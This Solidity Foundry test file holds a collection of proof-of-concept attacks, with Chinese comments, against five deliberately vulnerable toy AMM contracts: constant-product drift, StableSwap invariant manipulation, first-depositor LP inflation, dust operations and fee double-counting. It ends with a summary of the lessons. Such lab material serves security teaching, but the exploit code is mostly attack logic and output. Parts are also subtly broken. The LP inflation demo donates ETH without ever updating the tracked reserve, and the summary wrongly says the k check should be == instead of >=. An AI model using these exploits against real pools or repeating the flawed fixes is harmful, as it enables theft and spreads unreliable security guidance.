// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title AMM专项攻击完整PoC集合
 * @notice 这些是针对AMM机制本身的深层攻击
 * 
 * 五大核心攻击：
 * 1. Constant Product Abuse（恒定乘积滥用）
 * 2. Invariant Manipulation（不变量操纵）
 * 3. LP Share Inflation（LP份额通胀）
 * 4. Dust Attack（粉尘攻击）
 * 5. Fee Accounting Flaw（费用记账漏洞）
 * 
 */

// ============ 场景1: Constant Product Abuse（恒定乘积滥用）============

/**
 * @title 简单的恒定乘积AMM
 * @notice x * y = k 的实现
 */
contract SimpleConstantProductAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    uint256 public k; // 不变量
    
    uint256 public totalLiquidity;
    mapping(address => uint256) public liquidity;
    
    uint256 public constant FEE = 3; // 0.3%
    uint256 public constant FEE_DENOMINATOR = 1000;
    
    constructor(uint256 _reserve0, uint256 _reserve1) payable {
        require(_reserve0 > 0 && _reserve1 > 0, "Invalid reserves");
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        k = _reserve0 * _reserve1;
        
        totalLiquidity = sqrt(_reserve0 * _reserve1);
        liquidity[msg.sender] = totalLiquidity;
    }
    
    // 漏洞：没有检查k是否真的保持恒定
    function swap(uint256 amount0In, uint256 amount1Out) external payable {
        require(amount0In > 0, "Invalid input");
        require(msg.value == amount0In, "Wrong ETH");
        
        // 计算输出
        uint256 amount0InWithFee = (amount0In * (FEE_DENOMINATOR - FEE)) / FEE_DENOMINATOR;
        
        // 简单计算，没有严格检查k
        uint256 newReserve0 = reserve0 + amount0InWithFee;
        uint256 newReserve1 = reserve1 - amount1Out;
        
        // 只检查大于等于，允许k增长
        require(newReserve0 * newReserve1 >= k, "K violated");
        
        reserve0 = newReserve0;
        reserve1 = newReserve1;
        
        // k会漂移
        k = reserve0 * reserve1;
        
        payable(msg.sender).transfer(amount1Out);
    }
    
    function addLiquidity(uint256 amount0, uint256 amount1) external payable returns (uint256 shares) {
        require(msg.value == amount0, "Wrong ETH");
        
        if (totalLiquidity == 0) {
            shares = sqrt(amount0 * amount1);
        } else {
            shares = min(
                (amount0 * totalLiquidity) / reserve0,
                (amount1 * totalLiquidity) / reserve1
            );
        }
        
        liquidity[msg.sender] += shares;
        totalLiquidity += shares;
        
        reserve0 += amount0;
        reserve1 += amount1;
        k = reserve0 * reserve1;
    }
    
    function removeLiquidity(uint256 shares) external returns (uint256 amount0, uint256 amount1) {
        require(liquidity[msg.sender] >= shares, "Insufficient liquidity");
        
        amount0 = (shares * reserve0) / totalLiquidity;
        amount1 = (shares * reserve1) / totalLiquidity;
        
        liquidity[msg.sender] -= shares;
        totalLiquidity -= shares;
        
        reserve0 -= amount0;
        reserve1 -= amount1;
        k = reserve0 * reserve1;
        
        payable(msg.sender).transfer(amount0);
    }
    
    function getPrice() external view returns (uint256) {
        return (reserve1 * 1e18) / reserve0;
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    receive() external payable {}
}

/**
 * @title 恒定乘积滥用攻击
 */
contract ConstantProductAbuse {
    SimpleConstantProductAMM public amm;
    
    constructor(address payable _amm) {
        amm = SimpleConstantProductAMM(_amm);
    }
    
    function attack() external payable {
        console.log("\n=== Constant Product Abuse Attack ===");
        console.log("Initial k:", amm.k());
        console.log("Reserve0:", amm.reserve0());
        console.log("Reserve1:", amm.reserve1());
        
        // 执行多次小额swap
        console.log("\nExecuting multiple swaps to drift k...");
        
        uint256 initialK = amm.k();
        
        for (uint256 i = 0; i < 5; i++) {
            // 每次swap，k可能会轻微增加（由于舍入和费用）
            uint256 amountIn = 1 ether;
            uint256 amountOut = calculateAmountOut(amountIn);
            
            amm.swap{value: amountIn}(amountIn, amountOut);
            
            console.log("  Swap", i + 1, "- k:", amm.k());
        }
        
        uint256 finalK = amm.k();
        console.log("\nInitial k:", initialK);
        console.log("Final k:", finalK);
        console.log("k drift:", finalK > initialK ? finalK - initialK : 0);
        console.log("Drift percentage:", ((finalK - initialK) * 10000) / initialK, "bps");
    }
    
    function calculateAmountOut(uint256 amountIn) internal view returns (uint256) {
        uint256 amountInWithFee = (amountIn * 997) / 1000;
        return (amountInWithFee * amm.reserve1()) / (amm.reserve0() + amountInWithFee);
    }
    
    receive() external payable {}
}

// ============ 场景2: Invariant Manipulation（不变量操纵）============

/**
 * @title 带不变量检查的StableSwap风格AMM
 * @notice 简化的Curve/Balancer StableMath
 */
contract StableSwapAMM {
    uint256[] public balances;
    uint256 public D; // 不变量
    uint256 public A; // 放大系数
    
    uint256 public constant PRECISION = 1e18;
    uint256 public constant A_PRECISION = 100;
    
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    
    constructor(uint256 _A) payable {
        A = _A * A_PRECISION;
        
        // 初始化为2个代币的池子
        balances = new uint256[](2);
        balances[0] = 1000 ether;
        balances[1] = 1000 ether;
        
        D = _calculateD();
        totalShares = 1000 ether;
        shares[msg.sender] = 1000 ether;
    }
    
    // 不变量计算有精度问题
    function _calculateD() internal view returns (uint256) {
        uint256 S = 0;
        for (uint256 i = 0; i < balances.length; i++) {
            S += balances[i];
        }
        
        if (S == 0) return 0;
        
        uint256 Dprev = 0;
        uint256 D_curr = S;
        uint256 Ann = A * balances.length;
        
        for (uint256 j = 0; j < 255; j++) {
            uint256 D_P = D_curr;
            for (uint256 i = 0; i < balances.length; i++) {
                // 多重除法，累积精度损失
                D_P = (D_P * D_curr) / (balances[i] * balances.length);
            }
            
            Dprev = D_curr;
            D_curr = ((Ann * S + D_P * balances.length) * D_curr) / 
                    ((Ann - 1) * D_curr + (balances.length + 1) * D_P);
            
            // 检查收敛
            if (D_curr > Dprev) {
                if (D_curr - Dprev <= 1) break;
            } else {
                if (Dprev - D_curr <= 1) break;
            }
        }
        
        return D_curr;
    }
    
    // Swap没有严格验证不变量
    function swap(
        uint256 tokenIn,
        uint256 tokenOut,
        uint256 amountIn
    ) external payable returns (uint256 amountOut) {
        require(tokenIn < 2 && tokenOut < 2, "Invalid token");
        require(tokenIn != tokenOut, "Same token");
        
        if (tokenIn == 0) {
            require(msg.value == amountIn, "Wrong ETH");
        }
        
        // 更新输入余额
        balances[tokenIn] += amountIn;
        
        // 计算新的D
        uint256 newD = _calculateD();
        
        // 这里允许D漂移
        // 攻击者可以通过特定的swap序列让D增加
        
        // 计算输出量（简化）
        amountOut = balances[tokenOut] / 10; // 极度简化
        
        balances[tokenOut] -= amountOut;
        D = newD; // 更新D
        
        if (tokenOut == 0) {
            payable(msg.sender).transfer(amountOut);
        }
        
        return amountOut;
    }
    
    function getD() external view returns (uint256) {
        return _calculateD();
    }
    
    receive() external payable {}
}

/**
 * @title 不变量操纵攻击
 */
contract InvariantManipulation {
    StableSwapAMM public amm;
    
    constructor(address payable _amm) {
        amm = StableSwapAMM(_amm);
    }
    
    function attack() external payable {
        console.log("\n=== Invariant Manipulation Attack ===");
        console.log("Targeting StableSwap D invariant");
        
        uint256 initialD = amm.getD();
        console.log("Initial D:", initialD);
        console.log("Balance 0:", amm.balances(0));
        console.log("Balance 1:", amm.balances(1));
        
        // 策略：通过特定的swap序列操纵D
        console.log("\nExecuting manipulation sequence...");
        
        // Swap 1: 大额swap制造不平衡
        console.log("Step 1: Large swap to create imbalance");
        amm.swap{value: 500 ether}(0, 1, 500 ether);
        
        uint256 midD = amm.getD();
        console.log("D after step 1:", midD);
        console.log("Balance 0:", amm.balances(0));
        console.log("Balance 1:", amm.balances(1));
        
        // Swap 2: 多次小额swap累积误差
        console.log("\nStep 2: Multiple small swaps to accumulate rounding errors");
        for (uint256 i = 0; i < 10; i++) {
            amm.swap{value: 1 ether}(0, 1, 1 ether);
        }
        
        uint256 finalD = amm.getD();
        console.log("\nInitial D:", initialD);
        console.log("Final D:", finalD);
        
        if (finalD > initialD) {
            console.log("D increased by:", finalD - initialD);
            console.log("Percentage:", ((finalD - initialD) * 10000) / initialD, "bps");
        } else {
            console.log("D decreased by:", initialD - finalD);
        }
        
        console.log("\nThis D drift can be exploited:");
        console.log("- LPs lose value if D decreases");
        console.log("- Traders lose if D increases");
    }
    
    receive() external payable {}
}

// ============ 场景3: LP Share Inflation（LP份额通胀）============

/**
 * @title 有LP通胀漏洞的AMM
 * @notice 首个存款人攻击的变种
 */
contract InflatableAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    
    // 没有最小流动性要求
    function addLiquidity(uint256 amount0, uint256 amount1) 
        external 
        payable 
        returns (uint256 shares) 
    {
        require(msg.value == amount0, "Wrong ETH");
        
        if (totalSupply == 0) {
            shares = sqrt(amount0 * amount1);
        } else {
            shares = min(
                (amount0 * totalSupply) / reserve0,
                (amount1 * totalSupply) / reserve1
            );
        }
        
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        
        reserve0 += amount0;
        reserve1 += amount1;
        
        return shares;
    }
    
    function removeLiquidity(uint256 shares) 
        external 
        returns (uint256 amount0, uint256 amount1) 
    {
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");
        
        amount0 = (shares * reserve0) / totalSupply;
        amount1 = (shares * reserve1) / totalSupply;
        
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        
        reserve0 -= amount0;
        reserve1 -= amount1;
        
        payable(msg.sender).transfer(amount0);
        
        return (amount0, amount1);
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    receive() external payable {}
}

/**
 * @title LP份额通胀攻击
 */
contract LPShareInflation {
    InflatableAMM public amm;
    
    constructor(address payable _amm) {
        amm = InflatableAMM(_amm);
    }
    
    function attack() external payable {
        console.log("\n=== LP Share Inflation Attack ===");
        console.log("This is the 'First Depositor' attack on AMMs");
        
        // Step 1: 成为第一个LP，存入极小金额
        console.log("\nStep 1: Deposit minimal liquidity");
        uint256 minDeposit = 1000; // 1000 wei
        amm.addLiquidity{value: minDeposit}(minDeposit, minDeposit);
        
        console.log("Deposited:", minDeposit, "wei");
        console.log("Received shares:", amm.balanceOf(address(this)));
        console.log("Total supply:", amm.totalSupply());
        
        // Step 2: 直接转账大量资产（不通过addLiquidity）
        console.log("\nStep 2: Donate large amount directly");
        uint256 donateAmount = 10000 ether;
        payable(address(amm)).transfer(donateAmount);
        
        console.log("Donated:", donateAmount);
        console.log("Reserve0 now:", amm.reserve0());
        console.log("Total supply still:", amm.totalSupply());
        
        // Step 3: 计算每个份额的价值
        console.log("\nStep 3: Share value inflated!");
        uint256 shareValue = (amm.reserve0() * 1e18) / amm.totalSupply();
        console.log("Value per share:", shareValue);
        console.log("This is", shareValue / 1e18, "ETH per share");
        
        // Step 4: 受害者尝试添加流动性
        console.log("\nStep 4: Victim adds liquidity");
        console.log("Victim deposits 1 ETH");
        
        // 计算受害者会得到的份额
        uint256 victimShares = (1 ether * amm.totalSupply()) / amm.reserve0();
        console.log("Victim would get:", victimShares, "shares");
        
        if (victimShares == 0) {
            console.log(">>> Victim gets 0 shares! (rounded down)");
            console.log(">>> Victim loses 1 ETH for nothing!");
        }
        
        // Step 5: 攻击者移除流动性
        console.log("\nStep 5: Attacker removes liquidity");
        uint256 attackerShares = amm.balanceOf(address(this));
        amm.removeLiquidity(attackerShares);
        
        console.log("Attacker received:", address(this).balance);
        console.log("Profit:", address(this).balance > donateAmount + minDeposit ? 
            address(this).balance - donateAmount - minDeposit : 0);
    }
    
    receive() external payable {}
}

// ============ 场景4: Dust Attack（粉尘攻击）============

/**
 * @title 对粉尘金额处理不当的AMM
 */
contract DustVulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    
    // 没有最小金额限制
    function addLiquidity(uint256 amount0, uint256 amount1) 
        external 
        payable 
        returns (uint256 shares) 
    {
        require(msg.value == amount0, "Wrong ETH");
        
        if (totalSupply == 0) {
            shares = sqrt(amount0 * amount1);
        } else {
            shares = min(
                (amount0 * totalSupply) / reserve0,
                (amount1 * totalSupply) / reserve1
            );
        }
        
        // shares可能是0
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        
        reserve0 += amount0;
        reserve1 += amount1;
        
        return shares;
    }
    
    function swap(uint256 amount0In, uint256 amount1Out) 
        external 
        payable 
        returns (uint256) 
    {
        require(msg.value == amount0In, "Wrong ETH");
        
        // 没有最小swap金额
        // 费用计算可能返回0
        uint256 fee = (amount0In * 3) / 1000;
        
        uint256 amount0InWithFee = amount0In - fee;
        
        reserve0 += amount0In;
        reserve1 -= amount1Out;
        
        payable(msg.sender).transfer(amount1Out);
        
        return amount1Out;
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    receive() external payable {}
}

/**
 * @title 粉尘攻击
 */
contract DustAttack {
    DustVulnerableAMM public amm;
    
    constructor(address payable _amm) {
        amm = DustVulnerableAMM(_amm);
    }
    
    function attack() external payable {
        console.log("\n=== Dust Attack ===");
        console.log("Exploiting lack of minimum amount checks");
        
        // 攻击1：粉尘添加流动性
        console.log("\n--- Attack 1: Dust Liquidity ---");
        console.log("Adding 100 wei liquidity...");
        
        uint256 dustAmount = 100;
        uint256 sharesBefore = amm.balanceOf(address(this));
        amm.addLiquidity{value: dustAmount}(dustAmount, dustAmount);
        uint256 sharesReceived = amm.balanceOf(address(this)) - sharesBefore;
        
        console.log("Shares received:", sharesReceived);
        
        if (sharesReceived == 0) {
            console.log(">>> Got 0 shares for 100 wei!");
            console.log(">>> Lost 100 wei due to rounding");
        }
        
        // 攻击2：粉尘swap
        console.log("\n--- Attack 2: Dust Swap ---");
        console.log("Swapping 10 wei...");
        
        uint256 dustSwap = 10;
        uint256 amountOut = (dustSwap * amm.reserve1()) / amm.reserve0();
        
        if (amountOut > 0) {
            amm.swap{value: dustSwap}(dustSwap, amountOut);
            console.log("Swap succeeded");
        } else {
            console.log(">>> Swap would return 0!");
        }
        
        // 攻击3：大量粉尘操作消耗gas
        console.log("\n--- Attack 3: Gas Griefing ---");
        console.log("Performing 1000 dust operations...");
        console.log("This would waste gas for:");
        console.log("- Event emission");
        console.log("- Storage updates");
        console.log("- Pool state updates");
        console.log("(Not actually executing to save gas in test)");
    }
    
    receive() external payable {}
}

// ============ 场景5: Fee Accounting Flaw（费用记账漏洞）============

/**
 * @title 费用计算有问题的AMM
 */
contract FeeFlawAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    
    uint256 public accumulatedFees0;
    uint256 public accumulatedFees1;
    
    uint256 public constant FEE = 3; // 0.3%
    
    constructor(uint256 _reserve0, uint256 _reserve1) payable {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        totalSupply = sqrt(_reserve0 * _reserve1);
        balanceOf[msg.sender] = totalSupply;
    }
    
    // 费用计算有问题
    function swap(uint256 amount0In, uint256 amount1Out) external payable {
        require(msg.value == amount0In, "Wrong ETH");
        
        // 费用计算可能向下舍入为0
        uint256 fee = (amount0In * FEE) / 1000;
        
        // 费用没有正确累积
        accumulatedFees0 += fee;
        
        // 费用已经加到reserve，但又单独记录
        // 导致双重计费或记账错误
        reserve0 += amount0In; // 包含费用
        reserve1 -= amount1Out;
        
        payable(msg.sender).transfer(amount1Out);
    }
    
    // 提取费用时的问题
    function collectFees() external {
        // 可能提取超过实际累积的费用
        uint256 fee0 = accumulatedFees0;
        uint256 fee1 = accumulatedFees1;
        
        accumulatedFees0 = 0;
        accumulatedFees1 = 0;
        
        // 从reserve中扣除，但reserve已经包含了费用
        reserve0 -= fee0;
        reserve1 -= fee1;
        
        payable(msg.sender).transfer(fee0);
    }
    
    function addLiquidity(uint256 amount0, uint256 amount1) 
        external 
        payable 
        returns (uint256 shares) 
    {
        require(msg.value == amount0, "Wrong ETH");
        
        shares = min(
            (amount0 * totalSupply) / reserve0,
            (amount1 * totalSupply) / reserve1
        );
        
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        
        reserve0 += amount0;
        reserve1 += amount1;
        
        return shares;
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    receive() external payable {}
}

/**
 * @title 费用记账漏洞攻击
 */
contract FeeAccountingAttack {
    FeeFlawAMM public amm;
    
    constructor(address payable _amm) {
        amm = FeeFlawAMM(_amm);
    }
    
    function attack() external payable {
        console.log("\n=== Fee Accounting Flaw Attack ===");
        console.log("Exploiting double-counting of fees");
        
        console.log("\nInitial state:");
        console.log("Reserve0:", amm.reserve0());
        console.log("Accumulated fees0:", amm.accumulatedFees0());
        
        // Step 1: 执行swap累积费用
        console.log("\nStep 1: Execute swaps to accumulate fees");
        
        for (uint256 i = 0; i < 5; i++) {
            uint256 swapAmount = 10 ether;
            uint256 amountOut = (swapAmount * amm.reserve1()) / amm.reserve0();
            
            if (amountOut > 0 && amountOut < amm.reserve1()) {
                amm.swap{value: swapAmount}(swapAmount, amountOut);
                console.log("  Swap", i + 1, "completed");
            }
        }
        
        console.log("\nAfter swaps:");
        console.log("Reserve0:", amm.reserve0());
        console.log("Accumulated fees0:", amm.accumulatedFees0());
        
        // Step 2: 观察问题
        console.log("\nObserving the flaw:");
        uint256 reserve = amm.reserve0();
        uint256 fees = amm.accumulatedFees0();
        
        console.log("Reserve includes fees:", reserve);
        console.log("But fees also tracked separately:", fees);
        console.log("This is double-counting!");
        
        // Step 3: 尝试利用
        console.log("\nStep 3: Attempting to exploit");
        console.log("If fees are collected:");
        console.log("- Reserve decreases by", fees);
        console.log("- But actual value was already in reserve");
        console.log("- This breaks the reserve accounting");
        console.log("- LPs or traders will lose funds");
    }
    
    receive() external payable {}
}

// ============ Foundry 测试 ============

contract AMMAttacksTest is Test {
    SimpleConstantProductAMM public cpAMM;
    StableSwapAMM public stableAMM;
    InflatableAMM public inflatableAMM;
    DustVulnerableAMM public dustAMM;
    FeeFlawAMM public feeFlawAMM;
    
    function setUp() public {
        // 设置恒定乘积AMM
        cpAMM = new SimpleConstantProductAMM{value: 2000 ether}(1000 ether, 1000 ether);
        vm.deal(address(cpAMM), 2000 ether);
        
        // 设置StableSwap
        stableAMM = new StableSwapAMM{value: 2000 ether}(100);
        vm.deal(address(stableAMM), 2000 ether);
        
        // 设置可通胀AMM
        inflatableAMM = new InflatableAMM();
        vm.deal(address(inflatableAMM), 0);
        
        // 设置粉尘漏洞AMM
        dustAMM = new DustVulnerableAMM();
        vm.deal(address(dustAMM), 1000 ether);
        dustAMM.addLiquidity{value: 1000 ether}(1000 ether, 1000 ether);
        
        // 设置费用漏洞AMM
        feeFlawAMM = new FeeFlawAMM{value: 2000 ether}(1000 ether, 1000 ether);
        vm.deal(address(feeFlawAMM), 2000 ether);
    }
    
    function testConstantProductAbuse() public {
        ConstantProductAbuse attacker = new ConstantProductAbuse(payable(address(cpAMM)));
        vm.deal(address(attacker), 100 ether);
        
        attacker.attack{value: 5 ether}();
    }
    
    function testInvariantManipulation() public {
        InvariantManipulation attacker = new InvariantManipulation(payable(address(stableAMM)));
        vm.deal(address(attacker), 1000 ether);
        
        attacker.attack{value: 520 ether}();
    }
    
    function testLPShareInflation() public {
        LPShareInflation attacker = new LPShareInflation(payable(address(inflatableAMM)));
        vm.deal(address(attacker), 20000 ether);
        
        attacker.attack{value: 20000 ether}();
    }
    
    function testDustAttack() public {
        DustAttack attacker = new DustAttack(payable(address(dustAMM)));
        vm.deal(address(attacker), 1 ether);
        
        attacker.attack{value: 1000 wei}();
    }
    
    function testFeeAccountingFlaw() public {
        FeeAccountingAttack attacker = new FeeAccountingAttack(payable(address(feeFlawAMM)));
        vm.deal(address(attacker), 100 ether);
        
        attacker.attack{value: 50 ether}();
    }
}

/**
 * ============ 知识点总结 ============
 * 
 * 1. Constant Product Abuse:
 *    - x * y = k 应该严格保持
 *    - 但舍入/费用导致k漂移
 *    - 检查应该是 == 而不是 >=
 *    - 累积效应可观察
 * 
 * 2. Invariant Manipulation:
 *    - StableMath的D值应该恒定
 *    - 迭代计算累积误差
 *    - 不平衡状态放大误差
 *    - 特定swap序列可操纵
 * 
 * 3. LP Share Inflation:
 *    - 首个存款人攻击的变种
 *    - 最小流动性要求必需
 *    - Uniswap V2锁定1000 wei
 *    - 否则受害者损失全部存款
 * 
 * 4. Dust Attack:
 *    - 小额操作绕过检查
 *    - 费用计算返回0
 *    - 份额计算返回0
 *    - 需要最小金额限制
 * 
 * 5. Fee Accounting Flaw:
 *    - 费用双重计费
 *    - Reserve包含费用但单独追踪
 *    - 提取时扣除导致不一致
 *    - 需要清晰的费用模型
 */
